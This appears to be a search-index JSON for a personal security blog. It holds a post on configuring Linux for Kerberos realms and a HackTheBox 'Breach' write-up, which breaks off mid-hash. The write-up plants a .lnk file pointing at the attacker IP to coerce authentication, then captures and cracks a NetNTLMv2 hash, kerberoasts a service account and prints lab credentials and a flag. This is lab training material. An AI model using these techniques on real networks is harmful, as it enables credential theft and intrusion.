{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"About","text":""},{"location":"#about","title":"About","text":"<p>Here you might find writeups for CTF challenges, retired HTB/Offsec lab machines, etc.  Maybe a blog to talk about security-related topics involving CTFs or challenges.</p>"},{"location":"blog/2025/11/13/how-i-operate-in-a-kerberos-realm/","title":"How I operate in a Kerberos realm","text":"<p>When I am working in a Kerberos realm, there are a few things I do as a collection of standard procedure on any given engagement.</p> <ol> <li><code>/etc/hosts</code>: Add hostname mappings to IPs, and for DCs, explode every component of the DCs FQDN and associate it to the IP of the domain controller</li> <li><code>/etc/resolv.conf</code>: map the <code>domain</code> and <code>nameserver</code> entries to the primary domain and DC </li> <li><code>/etc/krb5.conf</code>: Generate a new <code>krb5.conf</code>, I have a utility I wrote that generates a new one</li> <li>timesync with the DC I am working with (at any given time).</li> </ol> <p>These steps enable <code>linux</code> toolchains that are designed to work within a Kerberos realm, such as (just to name a few):</p> <ul> <li>impacket</li> <li>bloodyAD</li> <li>powerview.py</li> <li>bloodhound-python / bloodhound-ce-python</li> <li>many, many others</li> </ul> <p>There are many advantages to working from a primarily <code>linux</code>-based workflow, such as avoiding dropping files on disk (i.e., <code>mimikatz</code>, <code>rubeus.exe</code>,<code>certify</code> etc.), avoiding <code>applocker</code> policies or <code>Defender</code>, wonky shells, etc.  </p>"},{"location":"blog/2025/11/13/how-i-operate-in-a-kerberos-realm/#etchosts","title":"/etc/hosts","text":"<p>Host entries in <code>/etc/hosts</code> should follow a pattern of most-descriptive to least-descriptive.  For example, a domain controller that serves as KDC for the realm would have a host entry like follows:</p> <pre><code>10.1.2.3 dc1.example.com example.com example dc1\n</code></pre> <p>Some tools and some protocols may only send part or all of the FQDN, an entry like above ensures that no matter the format of the request, the IP is the one that handles the request for that realm.</p>"},{"location":"blog/2025/11/13/how-i-operate-in-a-kerberos-realm/#etcresolvconf","title":"/etc/resolv.conf","text":"<p>Consult the manpage or, a slightly more humanized conversation around resolv.conf usage</p> <p>But two entries I like to use as a baseline are the <code>nameserver</code> and <code>search</code> configuration options, and typically I will make these entries the topmost entries above all others so that they are preferred:</p> <pre><code>search example.com\nnameserver 10.1.2.3\n</code></pre>"},{"location":"blog/2025/11/13/how-i-operate-in-a-kerberos-realm/#etckrb5conf","title":"/etc/krb5.conf","text":"<p>I have a utility I wrote for quickly building out the <code>/etc/krb5.conf</code>.  Automate the boring they say. </p> <p>The <code>-d</code> option can take a comma-delimited list of DC FQDNs, which is useful in cases where you need your <code>krb5.conf</code> to handle multiple realms.  The first DC specified in the list will be the default realm.</p> <p>Example:</p> <pre><code>sudo make_krb5.conf.py -d dc1.example.com,dc4.dev.example.com,dc2.engineering.example.com -w\n</code></pre> <p>Generates and writes a new <code>/etc/krb5.conf</code> like so:</p> <pre><code>kdc = FILE:/var/log/krb5_kdc.log\nadmin-server = FILE:/var/log/krb5_admin-server.log\ndefault = FILE:/var/log/krb5_default.log\n\n[libdefaults]\n        default_realm = EXAMPLE.COM\n        dns_lookup_realm = false\n        dns_lookup_kdc = false\n        # dns_uri_lookup = false  ## use this when trying to troubleshoot\n# The following krb5.conf variables are only for MIT Kerberos.\n        kdc_timesync = 1\n        ccache_type = 4\n        forwardable = true\n        proxiable = true\n        rdns = false\n# The following libdefaults parameters are only for Heimdal Kerberos.\n        fcc-mit-ticketflags = true\n\n[realms]\n    EXAMPLE.COM = {\n        kdc = dc1.example.com:88\n        admin_server = dc1.example.com\n        password_server = dc1.example.com\n        default_domain = example.com\n    }        \n    DEV.EXAMPLE.COM = {\n        kdc = dc4.dev.example.com:88\n        admin_server = dc4.dev.example.com\n        password_server = dc4.dev.example.com\n        default_domain = dev.example.com\n    }        \n    ENGINEERING.EXAMPLE.COM = {\n        kdc = dc2.engineering.example.com:88\n        admin_server = dc2.engineering.example.com\n        password_server = dc2.engineering.example.com\n        default_domain = engineering.example.com\n    }        \n\n[domain_realm]\n    example.com = EXAMPLE.COM\n    .example.com = EXAMPLE.COM        \n    dev.example.com = DEV.EXAMPLE.COM\n    .dev.example.com = DEV.EXAMPLE.COM        \n    engineering.example.com = ENGINEERING.EXAMPLE.COM\n    .engineering.example.com = ENGINEERING.EXAMPLE.COM                \n\n[+] Writing /etc/krb5.conf\n</code></pre>"},{"location":"blog/2025/11/13/how-i-operate-in-a-kerberos-realm/#timesync-with-a-dc","title":"timesync with a DC","text":"<p>Anyone that has ever tried to authenticate to a DC using Kerberos, and the DC is in a different time zone, knows of the pain and struggle:</p> <p>Example:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/hercules]\n\u2514\u2500$ impacket-getTGT example.com/g.oldie:'RuffigeKru#2'\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\nKerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\n</code></pre> <p>Now normally, we would just disable <code>ntpd</code> :</p> <pre><code>## one of the following, depending on what controls you\nsudo timedatectl set-ntp false\nsudo systemctl stop ntp.service\n</code></pre> <p>and sync the time with the DC using <code>ntpdate</code>: </p><pre><code>sudo ntpdate -u dc.example.com\n</code></pre><p></p> <p>However in my case, none of this works like above, because my Kali instance is in <code>Virtualbox</code>, and it is the one in control of time syncronization.  </p> <p>Its a little nuanced.  The short of it is that <code>virtualbox-guest-utils</code> service (systemd) is the one that calls  <code>/usr/sbin/VBoxService</code>, which handles (among a lot Guest Utils things), keeping the Guest OS time syncronized to the Host OS hypervisor.  I do need Guest Utils things, in fact all of them, with the exception of timesync (on these hacking Kerberos realm occasions).</p> <p>The service binary <code>/usr/sbin/VBoxService</code> can actually be called with an argument that disables time syncronization, but there is not interface for/to it through the <code>systemd</code> wrapper around it, or the init file that starts it.  You can't call <code>virtualbox-guest-utils</code> with any meaningful argument/environment variable to get passed to it being started, and there's no way of controlling the flag at the systemd unit.  </p> <p>So what I did was come up with another unit file, and some modifications to the init file, so that Guest Utils can be kept running but without time syncronization.  That way just the time syncronization could be toggled.</p> <p>Fully documented and repeatable here</p> <p>But basically with it, I can (effectively) disable just the timesync to the Host OS by starting the new service, then perform an <code>ntpdate -u [otherdomain]</code> as normal, and time synced to the otherdomain persists until reboot (or the service is stopped, forcing the real <code>virtualbox-guest-utils</code> to start again).</p> <pre><code>## decouple from VBox timesync\nsudo systemctl start vbox-disable-timesync.service\nsudo ntpdate -u dc1.example.com\n\n## recouple\nsudo systemctl stop vbox-disable-timesync.service\n</code></pre>"},{"location":"writeups/HackTheBox/Machines/Breach/","title":"Breach","text":"<p>Nmap scan of the target host </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb]\n\u2514\u2500$ nmap -A -Pn 10.129.38.236\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 22:54 PDT\nNmap scan report for 10.129.38.236\nHost is up (0.10s latency).\nNot shown: 986 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-title: IIS Windows Server\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-25 05:55:31Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-info: \n|   10.129.38.236:1433: \n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2025-10-25T05:56:19\n|_Not valid after:  2055-10-25T05:56:19\n| ms-sql-ntlm-info: \n|   10.129.38.236:1433: \n|     Target_Name: BREACH\n|     NetBIOS_Domain_Name: BREACH\n|     NetBIOS_Computer_Name: BREACHDC\n|     DNS_Domain_Name: breach.vl\n|     DNS_Computer_Name: BREACHDC.breach.vl\n|     DNS_Tree_Name: breach.vl\n|_    Product_Version: 10.0.20348\n|_ssl-date: 2025-10-25T09:57:48+00:00; 0s from scanner time.\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: BREACH\n|   NetBIOS_Domain_Name: BREACH\n|   NetBIOS_Computer_Name: BREACHDC\n|   DNS_Domain_Name: breach.vl\n|   DNS_Computer_Name: BREACHDC.breach.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2025-10-25T05:55:48+00:00\n|_ssl-date: 2025-10-25T05:56:27+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=BREACHDC.breach.vl\n| Not valid before: 2025-09-07T08:04:48\n|_Not valid after:  2026-03-09T08:04:48\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)\nOS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2025-10-25T05:55:52\n|_  start_date: N/A\n\nTRACEROUTE (using port 53/tcp)\nHOP RTT       ADDRESS\n1   105.63 ms 10.10.14.1\n2   105.65 ms 10.129.38.236\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 106.28 seconds\n</code></pre><p></p> <p>As this appears to be a domain controller, I have configured my environment for operation within a Kerberos realm, using standard TTPs, and some tooling I wrote for this purpose</p> <p>https://github.com/SYANiDE-/tooling</p> <pre><code>- entries in /etc/hosts\n    - echo \"10.129.38.236 breachdc.breach.vl breach.vl breach breachdc\" | sudo tee -a /etc/hosts\n- /etc/resolv.conf\n    - domain breach.vl\n    - nameserver 10.129.38.236\n- /etc/krb5.conf\n    - sudo make_krb5.conf.py -d breachdc.breach.vl -w\n- timesync to the domain controller\n    - sudo systemctl start vbox-disable-timesync.service\n    - sudo ntpdate -u breachdc\n</code></pre>"},{"location":"writeups/HackTheBox/Machines/Breach/#enumeration","title":"enumeration","text":"<p>The guest account is enabled</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb]\n\u2514\u2500$ nxc smb breachdc.breach.vl -u guest -p \"\"\nSMB         10.129.38.236   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\nSMB         10.129.38.236   445    BREACHDC         [+] breach.vl\\guest:\n</code></pre> <p>The guest account has read/write on the <code>share</code> share, and read permissions on the <code>users</code> share.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb]\n\u2514\u2500$ nxc smb breachdc.breach.vl -u guest -p \"\" --shares\nSMB         10.129.38.236   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\nSMB         10.129.38.236   445    BREACHDC         [+] breach.vl\\guest: \nSMB         10.129.38.236   445    BREACHDC         [*] Enumerated shares\nSMB         10.129.38.236   445    BREACHDC         Share           Permissions     Remark\nSMB         10.129.38.236   445    BREACHDC         -----           -----------     ------\nSMB         10.129.38.236   445    BREACHDC         ADMIN$                          Remote Admin\nSMB         10.129.38.236   445    BREACHDC         C$                              Default share\nSMB         10.129.38.236   445    BREACHDC         IPC$            READ            Remote IPC\nSMB         10.129.38.236   445    BREACHDC         NETLOGON                        Logon server share \nSMB         10.129.38.236   445    BREACHDC         share           READ,WRITE      \nSMB         10.129.38.236   445    BREACHDC         SYSVOL                          Logon server share \nSMB         10.129.38.236   445    BREACHDC         Users           READ\n</code></pre> <p>In the <code>share</code> share:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb]\n\u2514\u2500$ impacket-smbclient breach.vl/guest@breachdc.breach.vl -no-pass\n\n[...]\n# ls\ndrw-rw-rw-          0  Sat Oct 25 00:35:33 2025 .\ndrw-rw-rw-          0  Tue Sep  9 03:35:32 2025 ..\ndrw-rw-rw-          0  Thu Feb 17 03:19:36 2022 finance\ndrw-rw-rw-          0  Thu Feb 17 03:19:13 2022 software\ndrw-rw-rw-          0  Mon Sep  8 03:13:44 2025 transfer\n# cd transfer\n# pwd\n/transfer\n# ls\ndrw-rw-rw-          0  Mon Sep  8 03:13:44 2025 .\ndrw-rw-rw-          0  Sat Oct 25 00:35:33 2025 ..\ndrw-rw-rw-          0  Thu Feb 17 03:23:51 2022 claire.pope\ndrw-rw-rw-          0  Thu Feb 17 03:23:22 2022 diana.pope\ndrw-rw-rw-          0  Wed Apr 16 17:38:12 2025 julia.wong\n</code></pre> <p>None of these directories are accessible by <code>guest</code>.  But they are usernames, which might come in handy.</p> <p>The other folders, <code>finance</code> and <code>software</code> are empty.</p> <p>These users don't have <code>DONT_REQUIRE_PREAUTH</code> set</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-GetNPUsers -dc-host breachdc.breach.vl -usersfile users.txt breach.vl/guest -no-pass\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] User claire.pope doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User diana.pope doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User julia.wong doesn't have UF_DONT_REQUIRE_PREAUTH set\n</code></pre> <p>I used the <code>crackmapexec</code> <code>slinky</code> module to place an <code>.ico</code> on the <code>share</code> share, </p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ nxc smb breachdc.breach.vl -u guest -p \"\" -M slinky -o SERVER=10.10.14.204 NAME=funtime ICO_URI=\\\\\\\\10.10.14.204\\\\test\\\\icon.ico SHARES=share/software IGNORE=c\\$,admin\\$,netlogon,sysvol,users --smb-timeout 10\n</code></pre> <p>downloaded it, then re-uploaded it into all three folders using <code>impacket-smbclient</code>:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-smbclient breach.vl/guest@breachdc.breach.vl -no-passImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\nType help for list of commands\n# ls\ndrw-rw-rw-          0  Sat Oct 25 01:25:14 2025 .\ndrw-rw-rw-          0  Tue Sep  9 03:35:32 2025 ..\ndrw-rw-rw-          0  Sat Oct 25 01:20:09 2025 finance\ndrw-rw-rw-          0  Sat Oct 25 01:19:56 2025 software\ndrw-rw-rw-          0  Sat Oct 25 01:20:34 2025 transfer\n# use share\n# cd finance\n# put funtime.lnk\n# cd ../software\n# put funtime.lnk\n# cd ../transfer\n# put funtime.lnk\n</code></pre> <p>Stood up responder in analyze mode, and eventually I captured an NetNTLMv2-SSP authentication</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 2 ~/htb/machines/breach]\n\u2514\u2500$ sudo responder -I tun0 -A\n[sudo] password for notroot: \n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n\n[+] Poisoners:\n    LLMNR                      [OFF]\n    NBT-NS                     [OFF]\n    MDNS                       [OFF]\n    DNS                        [ON]\n    DHCP                       [OFF]\n\n[+] Servers:\n    HTTP server                [ON]\n    HTTPS server               [ON]\n    WPAD proxy                 [OFF]\n    Auth proxy                 [OFF]\n    SMB server                 [ON]\n    Kerberos server            [ON]\n    SQL server                 [ON]\n    FTP server                 [ON]\n    IMAP server                [ON]\n    POP3 server                [ON]\n    SMTP server                [ON]\n    DNS server                 [ON]\n    LDAP server                [ON]\n    MQTT server                [ON]\n    RDP server                 [ON]\n    DCE-RPC server             [ON]\n    WinRM server               [ON]\n    SNMP server                [ON]\n\n[+] HTTP Options:\n    Always serving EXE         [OFF]\n    Serving EXE                [OFF]\n    Serving HTML               [OFF]\n    Upstream Proxy             [OFF]\n\n[+] Poisoning Options:\n    Analyze Mode               [ON]\n    Force WPAD auth            [OFF]\n    Force Basic Auth           [OFF]\n    Force LM downgrade         [OFF]\n    Force ESS downgrade        [OFF]\n\n[+] Generic Options:\n    Responder NIC              [tun0]\n    Responder IP               [10.10.14.204]\n    Responder IPv6             [dead:beef:2::10ca]\n    Challenge set              [random]\n    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']\n    Don't Respond To MDNS TLD  ['_DOSVC']\n    TTL for poisoned response  [default]\n\n[+] Current Session Variables:\n    Responder Machine Name     [WIN-DHPV0P7ZJXQ]\n    Responder Domain Name      [SAHT.LOCAL]\n    Responder DCE-RPC Port     [47411]\n\n[*] Version: Responder 3.1.7.0\n[*] Author: Laurent Gaffie, &lt;lgaffie@secorizon.com&gt;\n[*] To sponsor Responder: https://paypal.me/PythonResponder\n\n[+] Listening for events...\n\n[Analyze mode: ICMP] You can ICMP Redirect on this network.\n[Analyze mode: ICMP] This workstation (10.10.14.204) is not on the same subnet than the DNS server (10.129.38.236).\n[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.\n[Analyze mode: ICMP] You can ICMP Redirect on this network.\n[Analyze mode: ICMP] This workstation (10.10.14.204) is not on the same subnet than the DNS server (192.168.50.1).\n[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.\n[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.\n[SMB] NTLMv2-SSP Client   : 10.129.38.236\n[SMB] NTLMv2-SSP Username : BREACH\\Julia.Wong\n[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:b8e16237cccbf32c:374403FAE1D07A04042DB4FBA1642BD5:0101000000000000801EB0A04C45DC0113874E71A609ED8E0000000002000800530041004800540001001E00570049004E002D0044004800500056003000500037005A004A005800510004003400570049004E002D0044004800500056003000500037005A004A00580051002E0053004100480054002E004C004F00430041004C000300140053004100480054002E004C004F00430041004C000500140053004100480054002E004C004F00430041004C0007000800801EB0A04C45DC0106000400020000000800300030000000000000000100000000200000D0EFE4A5B18E1ACF4FD3A7E00E6BC2F32D639EC43CD9B40C9FA69C3E42C199EC0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200300034000000000000000000\n</code></pre> <p>I was then able to crack the hash quite easily </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ hashcat --identify julia.wong.netntlmv2-ssp \nThe following hash-mode match the structure of your input hash:\n\n      # | Name                                                       | Category\n  ======+============================================================+======================================\n   5600 | NetNTLMv2                                                  | Network Protocol\n\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ hashcat -m 5600 julia.wong.netntlmv2-ssp /usr/share/wordlists/rockyou.txt --force --quiet\nJULIA.WONG::BREACH:b8e16237cccbf32c:374403fae1d07a04042db4fba1642bd5:0101000000000000801eb0a04c45dc0113874e71a609ed8e0000000002000800530041004800540001001e00570049004e002d0044004800500056003000500037005a004a005800510004003400570049004e002d0044004800500056003000500037005a004a00580051002e0053004100480054002e004c004f00430041004c000300140053004100480054002e004c004f00430041004c000500140053004100480054002e004c004f00430041004c0007000800801eb0a04c45dc0106000400020000000800300030000000000000000100000000200000d0efe4a5b18e1acf4fd3a7e00e6bc2f32d639ec43cd9b40c9fa69c3e42c199ec0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200300034000000000000000000:Computer1\n</code></pre><p></p> <p>Credential: </p><pre><code>julia.wong:Computer1\n</code></pre><p></p> <p>Get a ccache </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-getTGT breach.vl/julia.wong:Computer1\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket in julia.wong.ccache\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ export KRB5CCNAME=$(pwd)/julia.wong.ccache\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ klist\nTicket cache: FILE:/home/notroot/htb/machines/breach/julia.wong.ccache\nDefault principal: julia.wong@BREACH.VL\n\nValid starting       Expires              Service principal\n10/25/2025 01:29:19  10/25/2025 11:29:19  krbtgt/BREACH.VL@BREACH.VL\n        renew until 10/26/2025 01:29:19\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Breach/#what-can-juliawong-do","title":"What can julia.wong do","text":"<p>The user can read/write on the <code>share</code> share, and read on the <code>users</code> share</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ nxc smb breachdc.breach.vl -k --use-kcache --shares\nSMB         breachdc.breach.vl 445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\nSMB         breachdc.breach.vl 445    BREACHDC         [+] BREACH.VL\\julia.wong from ccache \nSMB         breachdc.breach.vl 445    BREACHDC         [*] Enumerated shares\nSMB         breachdc.breach.vl 445    BREACHDC         Share           Permissions     Remark\nSMB         breachdc.breach.vl 445    BREACHDC         -----           -----------     ------\nSMB         breachdc.breach.vl 445    BREACHDC         ADMIN$                          Remote Admin\nSMB         breachdc.breach.vl 445    BREACHDC         C$                              Default share\nSMB         breachdc.breach.vl 445    BREACHDC         IPC$            READ            Remote IPC\nSMB         breachdc.breach.vl 445    BREACHDC         NETLOGON        READ            Logon server share \nSMB         breachdc.breach.vl 445    BREACHDC         share           READ,WRITE      \nSMB         breachdc.breach.vl 445    BREACHDC         SYSVOL          READ            Logon server share \nSMB         breachdc.breach.vl 445    BREACHDC         Users           READ\n</code></pre> <p>Nothing particularly interesting in the <code>users</code> share for <code>julia.wong</code>, but the <code>share</code> share, <code>julia.wong</code> directory, found a <code>user.txt</code>.</p> <p>Flag:</p> <pre><code># pwd\n/transfer/julia.wong\n# cat user.txt\n55d33e52bc5fa7a687b9f0dcfa103dda\n</code></pre> <p>Get a list of usernames</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-GetADUsers -k -no-pass -all breach.vl/julia.wong@breachdc.breach.vl  | awk '{print $1}'\nImpacket\n\n[*]\n[*]\nName\n--------------------\nAdministrator\nGuest\nkrbtgt\nClaire.Pope\nJulia.Wong\nHilary.Reed\nDiana.Pope\nJasmine.Price\nGeorge.Williams\nLawrence.Kaur\nJasmine.Slater\nHugh.Watts\nChristine.Bruce\nsvc_mssql\n</code></pre> <p>When trying to kerberoast users, I found a type 18 hash for <code>krbtgt</code> (typically that account is uncrackable), and a type 23 for user <code>svc_mssql</code>, really only the latter is interesting/likely. </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-GetUserSPNs -k -no-pass -usersfile usernames.txt breach.vl/julia.wong@breachdc.breach.vl\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[...]\n$krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$a5e7289dba70d9f14d87fe9a9c755c68$5fa599a1f540061fb2ac763183bee9345f919e74475ec9ebd3ed16577467bbac36687f40bde507966e4c69160e124809694d4e439b6cf7b6e13a3fa979d41b89def9d4092e4d500279393a2c4053816ce493380a91cc6d3df537878386c5232d05e55fe5b383595a598a3ba6d851aa8050e24acd3e9262338cbbf217362628cd879d2bf28b71cc8490f4f925985e925e0c11cb034e0f596fdcc880cf776ff89bf074653fc845517fdf20fc000a764d60e8e40f02749fab8d3e933f97b5716c50e25ae5276b63f9f9cdb79310e2b78341e1e28cfd318aebcb161f24ef5375a24aef19fecdbfd6fcec43ef3a68ecd77a9871d5bc60d38b8fefef96bd8a8f3d810f99e072101544c016c59e5ae7e77b6d00374ddb6b8d04e66019cfbe4844d5f6e20ce0da93e5cb90d1166e3443938592c18cef268e1d03ec231386de645d06755c3413364e48cf7f0b2d043e8dfdd77cc1c36683f04ab393d09f80f3801a654d46632492d47a0e3202ee8893be81b99b2321912570ff009583eac925dd6c8cc8cfec9f6722d46fdbdbd9668cc69f381344c0fb2a289e4156e279cd45839f59967db489be7804b68cf4e28338e57265d80c738af907b6da89dd955ba8e4fbf964d302179cfe9b1933fa4c048a7323063c8d533f5109dc44322499332d74fcc1e5e413c836d0d327d32e776907a45aa16b338ab60498c3282ff349f3449db104045167faa0e1dd478fe592aaf0658d9c90083b83463071b26dfc0aed506d0d45e7d6d7eec361112a63390e5e8a302179be563639721362f8ae6a5a7ff7df22c658e855e0708fbc801b97249017540097ae081a63a1f421264dbbe87058043aa70ae5cd07d852a9c83a3ae6fb6be011fb25beed055597518e8ab08245ca90526c4b7ffa9d778c4ffbc91b9b5cdc87f01c92510a1e6a90f353fd695b1b538f6760dd983f1a404d581375b90e0cee7b53770fd448123d2dfcabf056ace05258f2d693d261e4380b81a53c392805e68b235ea14f75dadd658b766cc62829d834123a20624c2cd731083019bc3967bbb03874455cc0a7798af7c4b65329be27df0d3497fc1c3386b9c1cf01f4f9f210610c8fe82c9676be0ea048311245ab7a1b953a2f7b14745ccf3a72c08690bbe58278bed055a37a15cbf7afd650846d941f0bf590f9fafa8bd3b8cc9192731643116b3e1026630fb891833586ee59ac42747b69052aefd46c58275a857c2b0630021d922a223e443ea7eaaffa6374123d1e800fdbf97919a898fc38e9244b2af807bb145e670646d02162f052392bd7e5624ffd01dde9f51f28907df02281f979994bd5cb9a8b19574c346a716b0abac13669813c11dbfdd1bbc8640b62f256f62c1214b9d845992dadee03fa5fb7c28ac6a83b5d0f4675f9a80741e25507132a52710d972d887fcd5d0df9a21490e432be1e8f7a069e3ddef21121c7142f8e54cd29399b00c5adeabc\n</code></pre><p></p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ hashcat --identify svc_mssql.hash \nThe following hash-mode match the structure of your input hash:\n\n      # | Name                                                       | Category\n  ======+============================================================+======================================\n  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol\n\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ hashcat -m 13100 svc_mssql.hash /usr/share/wordlists/rockyou.txt --force --quiet \n$krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$a5e7289dba70d9f14d87fe9a9c755c68$5fa599a1f540061fb2ac763183bee9345f919e74475ec9ebd3ed16577467bbac36687f40bde507966e4c69160e124809694d4e439b6cf7b6e13a3fa979d41b89def9d4092e4d500279393a2c4053816ce493380a91cc6d3df537878386c5232d05e55fe5b383595a598a3ba6d851aa8050e24acd3e9262338cbbf217362628cd879d2bf28b71cc8490f4f925985e925e0c11cb034e0f596fdcc880cf776ff89bf074653fc845517fdf20fc000a764d60e8e40f02749fab8d3e933f97b5716c50e25ae5276b63f9f9cdb79310e2b78341e1e28cfd318aebcb161f24ef5375a24aef19fecdbfd6fcec43ef3a68ecd77a9871d5bc60d38b8fefef96bd8a8f3d810f99e072101544c016c59e5ae7e77b6d00374ddb6b8d04e66019cfbe4844d5f6e20ce0da93e5cb90d1166e3443938592c18cef268e1d03ec231386de645d06755c3413364e48cf7f0b2d043e8dfdd77cc1c36683f04ab393d09f80f3801a654d46632492d47a0e3202ee8893be81b99b2321912570ff009583eac925dd6c8cc8cfec9f6722d46fdbdbd9668cc69f381344c0fb2a289e4156e279cd45839f59967db489be7804b68cf4e28338e57265d80c738af907b6da89dd955ba8e4fbf964d302179cfe9b1933fa4c048a7323063c8d533f5109dc44322499332d74fcc1e5e413c836d0d327d32e776907a45aa16b338ab60498c3282ff349f3449db104045167faa0e1dd478fe592aaf0658d9c90083b83463071b26dfc0aed506d0d45e7d6d7eec361112a63390e5e8a302179be563639721362f8ae6a5a7ff7df22c658e855e0708fbc801b97249017540097ae081a63a1f421264dbbe87058043aa70ae5cd07d852a9c83a3ae6fb6be011fb25beed055597518e8ab08245ca90526c4b7ffa9d778c4ffbc91b9b5cdc87f01c92510a1e6a90f353fd695b1b538f6760dd983f1a404d581375b90e0cee7b53770fd